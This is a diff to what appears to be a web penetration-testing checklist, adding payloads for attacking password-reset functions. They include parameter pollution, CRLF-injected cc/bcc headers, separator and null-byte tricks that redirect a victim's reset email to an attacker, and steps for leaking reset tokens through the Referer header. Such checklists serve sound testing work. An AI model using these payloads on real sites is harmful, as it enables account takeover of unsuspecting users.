@@ -146,9 +146,53 @@
  	- test for HTTP parameter Pollution (HPP)
     --------------------------------------
 	- Test for SQLI in the reset pass send function
-    
     --------------------------------------
-		     
+	- Check for weak Cryptography in Password Reset 
+	--------------------------------------
+	# parameter pollution
+	email=victim@mail.com&email=hacker@mail.com
+	
+	# array of emails
+	{"email":["victim@mail.com","hacker@mail.com"]}
+	
+	# carbon copy
+	email=victim@mail.com%0A%0Dcc:hacker@mail.com
+	email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+	
+	# separator
+	email=victim@mail.com,hacker@mail.com
+	email=victim@mail.com%20hacker@mail.com
+	email=victim@mail.com|hacker@mail.com
+	#No domain:
+	email=victim
+	#No TLD (Top Level Domain):
+	email=victim@xyz
+	#change param case 
+	email=victim@mail.com&Email=attacker@mail.com
+	email@email.com**,**victim@hack.secry  
+	email@email**“,”**victim@hack.secry  
+	email@email.com**:**victim@hack.secry  
+	email@email.com**%0d%0a**victim@hack.secry  
+	**%0d%0a**victim@hack.secry  
+	**%0a**victim@hack.secry  
+	victim@hack.secry**%0d%0a**  
+	victim@hack.secry**%0a**  
+	victim@hack.secry**%0d**  
+	victim@hack.secry**%00**  
+	victim@hack.secry**{{}}**
+	--------------------------------------
+	- Ask for reset password and visit the link sent to your email
+	- Click on any social media icon on the page & intercept the request
+ 	- lock if the token link in the refere header or the request
+  	- Paswword reset link leak via referrer
+    	It allows the person who has control of site to change the user’s password (CSRF attack), because this person knows reset password token of the user.
+	--------------------------------------
+ 	- 
+
+
+
+
+       
 </details>
 
 -----------------------------------------------------------------------------
